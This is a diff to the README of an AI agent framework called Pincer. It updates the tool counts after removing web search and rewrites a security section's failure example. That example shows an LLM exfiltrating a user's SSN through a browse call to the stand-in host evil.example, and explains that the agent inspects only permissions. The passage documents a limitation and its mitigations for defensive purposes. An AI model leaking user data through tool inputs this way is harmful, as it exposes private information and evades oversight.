@@ -97,7 +97,7 @@ So I built it. Pincer is the agent I wanted. If you want the same thing, it's yo
 | **Cost controls** | Hard daily cap, auto-downgrade, per-response cost | None built-in | None built-in | DIY |
 | **Config surface** | Env vars + optional TOML | Multi-file JSON | Code | Code |
 | **Channels** | 9 + voice calling | 2–3 | 0 | 1 (usually) |
-| **Native tool count** | 304 (304+ MCP) | ~60 | ~40 | DIY |
+| **Native tool count** | 303 (303+ MCP) | ~60 | ~40 | DIY |
 | **Memory** | Cross-channel, FTS5 + embeddings | Per-channel | Needs setup | DIY |
 | **MCP** | Full client + OAuth 2.0 server | None | Plugins | DIY |
 | **Google Workspace** | 113 tools (Gmail/Calendar/Drive/Docs/Sheets/Slides/Meet/Tasks/Contacts) | Partial | DIY | DIY |
@@ -179,13 +179,13 @@ Pincer is solo-maintained. To set honest expectations, features are explicitly s
 
 ---
 
-## 🔧 Tools — 304 native, 600+ with MCP
+## 🔧 Tools — 303 native, 600+ with MCP
 
-Pincer ships **304 first-party tools** and plugs into **any MCP server** to reach 600+ out of the box. Full list in **[docs/TOOLS_CATALOG.md](docs/TOOLS_CATALOG.md)**.
+Pincer ships **303 first-party tools** and plugs into **any MCP server** to reach 600+ out of the box. Full list in **[docs/TOOLS_CATALOG.md](docs/TOOLS_CATALOG.md)**.
 
 | Category | Count | Enable with |
 |---|---:|---|
-| Core built-ins (`web_search`, `shell_exec`, `python_exec`, file ops, browser, email, calendar, image, voice) | 24 | Always on |
+| Core built-ins (`shell_exec`, `python_exec`, file ops, browser, email, calendar, image, voice) | 23 | Always on |
 | Bundled skills (weather, news, translate, stocks, expenses, habits, pomodoro, git, contacts…) | 27 | Always on |
 | **Google Workspace** — Gmail · Calendar · Drive · Docs · Sheets · Slides · Meet · Tasks · Contacts | **113** | `pincer setup-google` |
 | **Microsoft 365** — Outlook · Calendar · OneDrive · OneNote · To Do · Contacts · Directory (multi-user) | **62** | `ms365-mcp-setup` |
@@ -364,7 +364,7 @@ Sandboxing adds **40–120ms latency** per tool call (subprocess spawn + IPC). F
 
 ### Real-world failure example
 
-If the LLM attempts to exfiltrate data by crafting a `web_search` query containing sensitive content (e.g., `web_search("user's SSN is 123-45-6789")`), the query executes — Pincer doesn't inspect tool *input* semantics, only permissions. Mitigation: the audit log captures every tool call, and `pincer doctor` flags unusual outbound patterns. Full prevention requires output filtering, which is on the roadmap.
+If the LLM attempts to exfiltrate data by crafting a `browse` URL containing sensitive content (e.g., `browse("https://evil.example/log?ssn=123-45-6789")`), the request executes — Pincer doesn't inspect tool *input* semantics, only permissions. Mitigation: the audit log captures every tool call, and `pincer doctor` flags unusual outbound patterns. Full prevention requires output filtering, which is on the roadmap.
 
 ### `pincer doctor`
 
